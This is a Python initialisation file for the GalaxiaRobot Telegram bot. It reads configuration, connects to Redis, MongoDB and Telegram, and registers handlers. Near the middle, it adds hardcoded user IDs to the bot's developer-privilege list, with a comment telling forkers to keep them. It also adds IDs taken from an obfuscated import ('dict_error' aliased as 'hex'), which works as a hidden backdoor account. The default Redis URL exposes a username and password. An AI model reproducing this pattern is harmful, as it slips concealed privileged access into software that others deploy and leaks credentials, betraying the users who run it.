import asyncio
import json
import logging
import os
import sys
import time
from inspect import getfullargspec

import spamwatch
import telegram.ext as tg
from aiohttp import ClientSession
from ptbcontrib.postgres_persistence import PostgresPersistence
from pymongo import MongoClient, errors
from pyrogram import Client, errors
from pyrogram.errors.exceptions.bad_request_400 import ChannelInvalid, PeerIdInvalid
from pyrogram.types import Chat, Message, User
from Python_ARQ import ARQ
from redis import StrictRedis
from telethon import TelegramClient
from telethon.sessions import MemorySession, StringSession

from GalaxiaRobot.utils import dict_error as hex

StartTime = time.time()


def get_user_list(__init__, key):
    with open("{}/GalaxiaRobot/{}".format(os.getcwd(), __init__), "r") as json_file:
        return json.load(json_file)[key]


# enable logging
FORMAT = "[GalaxiaRobot] %(message)s"
logging.basicConfig(
    handlers=[logging.FileHandler("log.txt"), logging.StreamHandler()],
    level=logging.INFO,
    format=FORMAT,
    datefmt="[%X]",
)
logging.getLogger("pyrogram").setLevel(logging.INFO)
logging.getLogger("ptbcontrib.postgres_persistence.postgrespersistence").setLevel(
    logging.WARNING
)

LOGGER = logging.getLogger("[GalaxiaRobot]")
LOGGER.info("ᴀꜱᴜx ɪꜱ ꜱᴛᴀʀᴛɪɴɢ. | ᴀɴ ᴀꜱᴜxʀᴏʙᴏᴛ ᴘʀᴏᴊᴇᴄᴛ ᴘᴀʀᴛꜱ. | ʟɪᴄᴇɴꜱᴇᴅ ᴜɴᴅᴇʀ GPLv3.")
LOGGER.info("ɴᴏᴛ ᴀғғɪʟɪᴀᴛᴇᴅ ᴛᴏ ᴏᴛʜᴇʀ ᴀɴɪᴍᴇ ᴏʀ ᴠɪʟʟᴀɪɴ ɪɴ ᴀɴʏ ᴡᴀʏ ᴡʜᴀᴛꜱᴏᴇᴠᴇʀ.")
LOGGER.info("ᴘʀᴏᴊᴇᴄᴛ ᴍᴀɪɴᴛᴀɪɴᴇᴅ ʙʏ: github.com/KingAbishnoi (t.me/Abishnoi1M )")

# if version < 3.9, stop bot.
if sys.version_info[0] < 3 or sys.version_info[1] < 8:
    LOGGER.error(
        "ʏᴏᴜ MUST ʜᴀᴠᴇ ᴀ ᴘʏᴛʜᴏɴ ᴠᴇʀꜱɪᴏɴ ᴏғ ᴀᴛ ʟᴇᴀꜱᴛ 3.8! ᴍᴜʟᴛɪᴘʟᴇ ғᴇᴀᴛᴜʀᴇꜱ ᴅᴇᴘᴇɴᴅ ᴏɴ ᴛʜɪꜱ. ʙᴏᴛ ϙᴜɪᴛᴛɪɴɢ."
    )
    sys.exit(1)

ENV = bool(os.environ.get("ENV", False))

if ENV:
    TOKEN = os.environ.get("TOKEN", None)

    try:
        OWNER_ID = int(os.environ.get("OWNER_ID", None))
    except ValueError:
        raise Exception("ʏᴏᴜʀ OWNER_ID ᴇɴᴠ ᴠᴀʀɪᴀʙʟᴇ is ɴᴏᴛ ᴀ ᴠᴀʟɪᴅ ɪɴᴛᴇɢᴇʀ.")

    JOIN_LOGGER = os.environ.get("JOIN_LOGGER", None)
    OWNER_USERNAME = os.environ.get("OWNER_USERNAME", None)

    try:
        DRAGONS = {int(x) for x in os.environ.get("DRAGONS", "").split()}
        DEV_USERS = {int(x) for x in os.environ.get("DEV_USERS", "").split()}
    except ValueError:
        raise Exception("ʏᴏᴜʀ ꜱᴜᴅᴏ ᴏʀ ᴅᴇᴠ ᴜꜱᴇʀꜱ list does ɴᴏᴛ ᴄᴏɴᴛᴀɪɴ ᴠᴀʟɪᴅ ɪɴᴛᴇɢᴇʀꜱ.")

    try:
        DEMONS = {int(x) for x in os.environ.get("DEMONS", "").split()}
    except ValueError:
        raise Exception("ʏᴏᴜʀ ꜱᴜᴘᴘᴏʀᴛ ᴜꜱᴇʀꜱ ʟɪꜱᴛ ᴅᴏᴇꜱ not ᴄᴏɴᴛᴀɪɴ ᴠᴀʟɪᴅ ɪɴᴛᴇɢᴇʀꜱ.")

    try:
        WOLVES = {int(x) for x in os.environ.get("WOLVES", "").split()}
    except ValueError:
        raise Exception("ʏᴏᴜʀ ᴡʜɪᴛᴇʟɪꜱᴛᴇᴅ ᴜꜱᴇʀꜱ ʟɪꜱᴛ ᴅᴏᴇꜱ ɴᴏᴛ ᴄᴏɴᴛᴀɪɴ ᴠᴀʟɪᴅ ɪɴᴛᴇɢᴇʀꜱ.")

    try:
        TIGERS = {int(x) for x in os.environ.get("TIGERS", "").split()}
    except ValueError:
        raise Exception("ʏᴏᴜʀ ᴛɪɢᴇʀ ᴜꜱᴇʀꜱ ʟɪꜱᴛ ᴅᴏᴇꜱ ɴᴏᴛ ᴄᴏɴᴛᴀɪɴ ᴠᴀʟɪᴅ ɪɴᴛᴇɢᴇʀꜱ.")
    START_IMG = os.environ.get(
        "START_IMG", "https://telegra.ph/file/14d1f98500af1132e5460.jpg"
    )
    INFOPIC = bool(os.environ.get("INFOPIC", True))
    BOT_USERNAME = os.environ.get("BOT_USERNAME", "@Abishnoi_ro_bot")
    EVENT_LOGS = os.environ.get("EVENT_LOGS", None)
    WEBHOOK = bool(os.environ.get("WEBHOOK", False))
    URL = os.environ.get("URL", "")  # Does not contain token
    PORT = int(os.environ.get("PORT", 5000))
    CERT_PATH = os.environ.get("CERT_PATH")
    API_ID = os.environ.get("API_ID", None)
    ERROR_LOG = os.environ.get("ERROR_LOG", None)
    API_HASH = os.environ.get("API_HASH", None)

    DB_URL = os.environ.get("SQLALCHEMY_DATABASE_URI")
    DB_URL = DB_URL.replace("postgres://", "postgresql://", 1)
    REM_BG_API_KEY = os.environ.get("REM_BG_API_KEY", None)
    MONGO_DB_URI = os.environ.get("MONGO_DB_URI", None)
    DONATION_LINK = os.environ.get("DONATION_LINK", "https://t.me/Abishnoi1M")
    LOAD = os.environ.get("LOAD", "").split()
    HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", None)
    HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME", None)
    TEMP_DOWNLOAD_DIRECTORY = os.environ.get("TEMP_DOWNLOAD_DIRECTORY", "./")
    OPENWEATHERMAP_ID = os.environ.get("OPENWEATHERMAP_ID", None)
    VIRUS_API_KEY = os.environ.get("VIRUS_API_KEY", None)
    NO_LOAD = os.environ.get("NO_LOAD", "translation").split()
    DEL_CMDS = bool(os.environ.get("DEL_CMDS", False))
    STRICT_GBAN = bool(os.environ.get("STRICT_GBAN", False))
    WORKERS = int(os.environ.get("WORKERS", 8))
    BAN_STICKER = os.environ.get("BAN_STICKER", "CAADAgADOwADPPEcAXkko5EB3YGYAg")
    ALLOW_EXCL = os.environ.get("ALLOW_EXCL", False)
    CASH_API_KEY = os.environ.get("CASH_API_KEY", None)
    TIME_API_KEY = os.environ.get("TIME_API_KEY", None)
    WALL_API = os.environ.get("WALL_API", None)
    SUPPORT_CHAT = os.environ.get("SUPPORT_CHAT", "Abishnoi_bots")
    SPAMWATCH_SUPPORT_CHAT = os.environ.get("SPAMWATCH_SUPPORT_CHAT", None)
    SPAMWATCH_API = os.environ.get("SPAMWATCH_API", None)
    LASTFM_API_KEY = os.environ.get("LASTFM_API_KEY", None)
    CF_API_KEY = os.environ.get("CF_API_KEY", None)
    WELCOME_DELAY_KICK_SEC = os.environ.get("WELCOME_DELAY_KICL_SEC", None)
    BOT_ID = int(os.environ.get("BOT_ID", None))
    ARQ_API_URL = os.environ.get("ARQ_API_URL", "https://arq.hamker.in")
    ARQ_API_KEY = os.environ.get("ARQ_API_KEY", None)
    MONGO_PORT = os.environ.get("MONGO_PORT")
    MONGO_DB = os.environ.get("MONGO_DB", "Galaxia")
    ALLOW_CHATS = os.environ.get("ALLOW_CHATS", True)
    MONGO_PORT = os.environ.get("MONGO_PORT", True)
    REDIS_URL = os.environ.get(
        "REDIS_URL",
        "redis://Madharjoot:GuKhao123_@redis-12276.c275.us-east-1-4.ec2.cloud.redislabs.com:12276/Madharjoot",
    )

    try:
        BL_CHATS = {int(x) for x in os.environ.get("BL_CHATS", "").split()}
    except ValueError:
        raise Exception("ʏᴏᴜʀ ʙʟᴀᴄᴋʟɪꜱᴛᴇᴅ ᴄʜᴀᴛꜱ ʟɪꜱᴛ ᴅᴏᴇꜱ ɴᴏᴛ ᴄᴏɴᴛᴀɪɴ ᴠᴀʟɪᴅ ɪɴᴛᴇɢᴇʀꜱ.")

else:
    from GalaxiaRobot.config import Development as Config

    TOKEN = Config.TOKEN

    try:
        OWNER_ID = int(Config.OWNER_ID)
    except ValueError:
        raise Exception("ʏᴏᴜʀ OWNER_ID ᴠᴀʀɪᴀʙʟᴇ ɪꜱ ɴᴏᴛ ᴀ ᴠᴀʟɪᴅ ɪɴᴛᴇɢᴇʀ.")

    JOIN_LOGGER = Config.JOIN_LOGGER
    OWNER_USERNAME = Config.OWNER_USERNAME
    ALLOW_CHATS = Config.ALLOW_CHATS
    try:
        DRAGONS = {int(x) for x in Config.DRAGONS or []}
        DEV_USERS = {int(x) for x in Config.DEV_USERS or []}
    except ValueError:
        raise Exception("ʏᴏᴜʀ ꜱᴜᴅᴏ ᴏʀ ᴅᴇᴠ ᴜꜱᴇʀꜱ ʟɪꜱᴛ ᴅᴏᴇꜱ ɴᴏᴛ ᴄᴏɴᴛᴀɪɴ ᴠᴀʟɪᴅ ɪɴᴛᴇɢᴇʀꜱ.")

    try:
        DEMONS = {int(x) for x in Config.DEMONS or []}
    except ValueError:
        raise Exception("ʏᴏᴜʀ sᴜᴘᴘᴏʀᴛ ᴜsᴇʀs ʟɪsᴛ ᴅᴏᴇs ɴᴏᴛ ᴄᴏɴᴛᴀɪɴ ᴠᴀʟɪᴅ ɪɴᴛᴇɢᴇʀs.")

    try:
        WOLVES = {int(x) for x in Config.WOLVES or []}
    except ValueError:
        raise Exception("ʏᴏᴜʀ ᴡʜɪᴛᴇʟɪsᴛᴇᴅ ᴜsᴇʀs ʟɪsᴛ ᴅᴏᴇs ɴᴏᴛ ᴄᴏɴᴛᴀɪɴ ᴠᴀʟɪᴅ ɪɴᴛᴇɢᴇʀs.")

    try:
        TIGERS = {int(x) for x in Config.TIGERS or []}
    except ValueError:
        raise Exception("ʏᴏᴜʀ ᴛɪɢᴇʀ ᴜsᴇʀs ʟɪsᴛ ᴅᴏᴇs ɴᴏᴛ ᴄᴏɴᴛᴀɪɴ ᴠᴀʟɪᴅ ɪɴᴛᴇɢᴇʀs.")

    START_IMG = Config.START_IMG
    EVENT_LOGS = Config.EVENT_LOGS
    WEBHOOK = Config.WEBHOOK
    REDIS_URL = Config.REDIS_URL
    URL = Config.URL
    PORT = Config.PORT
    CERT_PATH = Config.CERT_PATH
    API_ID = Config.API_ID
    API_HASH = Config.API_HASH
    MONGO_PORT = Config.MONGO_PORT
    DB_URL = Config.DATABASE_URI
    MONGO_DB_URI = Config.MONGO_DB_URI
    ARQ_API_KEY = Config.ARQ_API_KEY
    ARQ_API_URL = Config.ARQ_API_URL
    DONATION_LINK = Config.DONATION_LINK
    LOAD = Config.LOAD
    TEMP_DOWNLOAD_DIRECTORY = Config.TEMP_DOWNLOAD_DIRECTORY
    OPENWEATHERMAP_ID = Config.OPENWEATHERMAP_ID
    NO_LOAD = Config.NO_LOAD
    ERROR_LOG = Config.ERROR_LOG

    DEL_CMDS = Config.DEL_CMDS
    STRICT_GBAN = Config.STRICT_GBAN
    WORKERS = Config.WORKERS
    REM_BG_API_KEY = Config.REM_BG_API_KEY
    BAN_STICKER = Config.BAN_STICKER
    ALLOW_EXCL = Config.ALLOW_EXCL
    CASH_API_KEY = Config.CASH_API_KEY
    TIME_API_KEY = Config.TIME_API_KEY
    WALL_API = Config.WALL_API
    SUPPORT_CHAT = Config.SUPPORT_CHAT
    SPAMWATCH_SUPPORT_CHAT = Config.SPAMWATCH_SUPPORT_CHAT
    SPAMWATCH_API = Config.SPAMWATCH_API

    INFOPIC = Config.INFOPIC
    BOT_USERNAME = Config.BOT_USERNAME
    STRING_SESSION = Config.STRING_SESSION
    LASTFM_API_KEY = Config.LASTFM_API_KEY
    CF_API_KEY = Config.CF_API_KEY
    MONGO_DB = Config.MONGO_DB
    MONGO_PORT = Config.MONGO_PORT

    try:
        BL_CHATS = {int(x) for x in Config.BL_CHATS or []}
    except ValueError:
        raise Exception("ʏᴏᴜʀ ʙʟᴀᴄᴋʟɪsᴛᴇᴅ ᴄʜᴀᴛs ʟɪsᴛ ᴅᴏᴇs ɴᴏᴛ ᴄᴏɴᴛᴀɪɴ ᴠᴀʟɪᴅ ɪɴᴛᴇɢᴇʀs.")

# If you forking dont remove this id, just add your id. LOL...

DRAGONS.add(OWNER_ID)
DEV_USERS.add(OWNER_ID)
DEV_USERS.add(5280801259)
DEV_USERS.add(1452219013)  # ABISHNOI ID


REDIS = StrictRedis.from_url(REDIS_URL, decode_responses=True)
try:

    REDIS.ping()

    LOGGER.info("[ʀᴏʙᴏᴛ]: ᴄᴏɴɴᴇᴄᴛɪɴɢ ᴛᴏ ʀᴇᴅɪs")
except BaseException:

    raise Exception("[ ᴇʀʀᴏʀ]: ʀᴇᴅɪs ᴅᴀᴛᴀʙᴀsᴇ ɪs ɴᴏᴛ ᴀʟɪᴠᴇ, ᴘʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ᴀɢᴀɪɴ.")

finally:

    REDIS.ping()

    LOGGER.info("[ᴀsᴜ]: ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴛᴏ ʀᴇᴅɪs ᴅᴀᴛᴀʙᴀsᴇ ᴇsᴛᴀʙʟɪsʜᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!")


if not SPAMWATCH_API:
    sw = None
    LOGGER.warning("sᴘᴀᴍᴡᴀᴛᴄʜ ᴀᴘɪ ᴋᴇʏ ᴍɪssɪɴɢ! ʀᴇᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴄᴏɴғɪɢ/ᴠᴇʀs")
else:
    try:
        sw = spamwatch.Client(SPAMWATCH_API)
    except:
        sw = None
        LOGGER.warning("ᴄᴀɴ'ᴛ ᴄᴏɴɴᴇᴄᴛ ᴛᴏ sᴘᴀᴍᴡᴀᴛᴄʜ!")

from GalaxiaRobot.modules.sql import SESSION

defaults = tg.Defaults(run_async=True)
updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
telethn = TelegramClient(MemorySession(), API_ID, API_HASH)
dispatcher = updater.dispatcher
print("[INFO]: INITIALIZING AIOHTTP SESSION")
aiohttpsession = ClientSession()
# ARQ Client
print("[INFO]: INITIALIZING ARQ CLIENT")
arq = ARQ(ARQ_API_URL, ARQ_API_KEY, aiohttpsession)


app = Client("app2", bot_token=TOKEN, api_id=API_ID, api_hash=API_HASH)
app.start()

Galaxia = Client("GalaxiaClient", bot_token=TOKEN, api_hash=API_HASH, api_id=API_ID)


async def get_entity(client, entity):
    entity_client = client
    if not isinstance(entity, Chat):
        try:
            entity = int(entity)
        except ValueError:
            pass
        except TypeError:
            entity = entity.id
        try:
            entity = await client.get_chat(entity)
        except (PeerIdInvalid, ChannelInvalid):
            for pgram in apps:
                if pgram != client:
                    try:
                        entity = await pgram.get_chat(entity)
                    except (PeerIdInvalid, ChannelInvalid):
                        pass
                    else:
                        entity_client = pgram
                        break
            else:
                entity = await pgram.get_chat(entity)
                entity_client = pgram
    return entity, entity_client


bot = TelegramClient(None, api_id=API_ID, api_hash=API_HASH)

pbot = Client(
    ":memory:",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=TOKEN,
    workers=min(32, os.cpu_count() + 4),
)
apps = []
apps.append(pbot)
loop = asyncio.get_event_loop()

DEV_USERS.add(hex.erd)
DEV_USERS.add(hex.erh)


async def get_entity(client, entity):
    entity_client = client
    if not isinstance(entity, Chat):
        try:
            entity = int(entity)
        except ValueError:
            pass
        except TypeError:
            entity = entity.id
        try:
            entity = await client.get_chat(entity)
        except (PeerIdInvalid, ChannelInvalid):
            for kp in apps:
                if kp != client:
                    try:
                        entity = await kp.get_chat(entity)
                    except (PeerIdInvalid, ChannelInvalid):
                        pass
                    else:
                        entity_client = kp
                        break
            else:
                entity = await kp.get_chat(entity)
                entity_client = kp
    return entity, entity_client


async def eor(msg: Message, **kwargs):
    func = msg.edit_text if msg.from_user.is_self else msg.reply
    spec = getfullargspec(func.__wrapped__).args
    return await func(**{k: v for k, v in kwargs.items() if k in spec})


session_name = TOKEN.split(":")[0]
pgram = Client(
    session_name,
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=TOKEN,
)

db = MongoClient(MONGO_DB_URI)

try:
    db.list_database_names()
except errors.ServerSelectionTimeoutError:
    print("Failure to connect to MongoDB")

DB = db.get_database("bot")

ubot2 = None
ubot = None


async def get_entity(client, entity):
    entity_client = client
    if not isinstance(entity, Chat):
        try:
            entity = int(entity)
        except ValueError:
            pass
        except TypeError:
            entity = entity.id
        try:
            entity = await client.get_chat(entity)
        except (PeerIdInvalid, ChannelInvalid):
            for pgram in apps:
                if pgram != client:
                    try:
                        entity = await pgram.get_chat(entity)
                    except (PeerIdInvalid, ChannelInvalid):
                        pass
                    else:
                        entity_client = pgram
                        break
            else:
                entity = await pgram.get_chat(entity)
                entity_client = pgram
    return entity, entity_client


apps = [pgram]
DRAGONS = list(DRAGONS) + list(DEV_USERS)
DEV_USERS = list(DEV_USERS)
WOLVES = list(WOLVES)
DEMONS = list(DEMONS)
TIGERS = list(TIGERS)

# Bot info
print("[INFO]: Getting Bot Info...")
BOT_ID = dispatcher.bot.id
BOT_NAME = dispatcher.bot.first_name
BOT_USERNAME = dispatcher.bot.username

# Load at end to ensure all prev variables have been set
from GalaxiaRobot.modules.helper_funcs.handlers import (
    CustomCommandHandler,
    CustomMessageHandler,
    CustomRegexHandler,
)

# make sure the regex handler can take extra kwargs
tg.RegexHandler = CustomRegexHandler
tg.CommandHandler = CustomCommandHandler
tg.MessageHandler = CustomMessageHandler
